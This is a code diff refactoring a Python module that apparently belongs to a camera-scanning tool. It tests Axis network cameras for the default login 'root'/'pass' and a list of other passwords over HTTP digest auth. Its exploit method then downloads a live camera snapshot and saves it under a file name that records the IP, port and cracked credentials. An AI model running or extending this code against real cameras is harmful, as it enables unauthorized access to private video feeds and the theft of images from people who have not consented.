@@ -1,41 +1,33 @@
 import requests
+from requests import auth as req_auth
 
 from loguru import logger
 
-from .base import POCTemplate
+from .base import WeakPasswordPOC
 
 
-class AxisWeakPassword(POCTemplate):
-
-    def __init__(self, config):
-        super().__init__(config)
-        self.name = self.get_file_name(__file__)
-        self.product = config.product['axis']
-        self.product_version = ''
-        self.ref = ''
-        self.level = POCTemplate.level.low
-        self.desc = """"""
-        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
+class AxisWeakPassword(WeakPasswordPOC):
+    product_key = 'axis'
 
     def verify(self, ip, port=80):
-        _users = ['root']    # default user
-        _passwords = ['pass'] + self.config.passwords
-        for user in _users:
-            for password in _passwords:
+        # Axis uses 'root' as default user and 'pass' as an additional default password
+        for user in ['root']:
+            for password in ['pass'] + list(self.config.passwords):
                 try:
-                    r = requests.get(url=f"http://{ip}:{port}/jpg/image.jpg", auth=requests.auth.HTTPDigestAuth(user, password), timeout=self.config.timeout, headers=self.headers, verify=False)
-                    if r.status_code == 200:
+                    if self._check(ip, port, user, password):
                         return ip, str(port), self.product, str(user), str(password), self.name
                 except Exception as e:
-                    logger.error(e)
+                    logger.debug(e)
         return None
 
-    def exploit(self, results):
-        ip, port, product, user, password, vul = results
-        url = f"http://{ip}:{port}/jpg/image.jpg"
-        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
-        if self._snapshot(url, img_file_name, auth=requests.auth.HTTPDigestAuth(user, password)):
-            return 1
-        return 0
+    def _check(self, ip, port, user, password):
+        r = requests.get(f"http://{ip}:{port}/jpg/image.jpg",
+                         auth=req_auth.HTTPDigestAuth(user, password),
+                         headers=self.headers, timeout=self.config.timeout, verify=False)
+        return r.status_code == 200
 
-POCTemplate.register_poc(AxisWeakPassword)
+    def exploit(self, results):
+        ip, port, _, user, password, _ = results
+        return self._snapshot(f"http://{ip}:{port}/jpg/image.jpg",
+                              f"{ip}-{port}-{user}-{password}.jpg",
+                              auth=req_auth.HTTPDigestAuth(user, password))
